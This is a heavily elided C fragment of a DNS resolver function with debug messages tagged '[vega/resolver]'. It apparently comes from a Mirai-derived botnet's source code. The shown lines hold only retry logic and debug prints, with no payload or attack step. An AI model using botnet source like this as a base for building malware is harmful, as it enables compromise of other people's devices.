...
struct resolv_entries *resolv_lookup(char *domain)
{
    ...
    while (tries++ < 5)
    {
        ...
        {
#ifdef DEBUG
            printf("[vega/resolver] failed to create socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[vega/resolver] failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[vega/resolver] failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[vega/resolver] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[vega/resolver] couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[vega/resolver] got response from select\n");
#endif
...
#ifdef DEBUG
                        printf("[vega/resolver] found ipv4 address: %08x\n", (*p));
#endif
                    }
...
#ifdef DEBUG
    printf("[vega/resolver] resolved %s to %d ipv4 addresses\n", domain, entries->addrs_len);
#endif
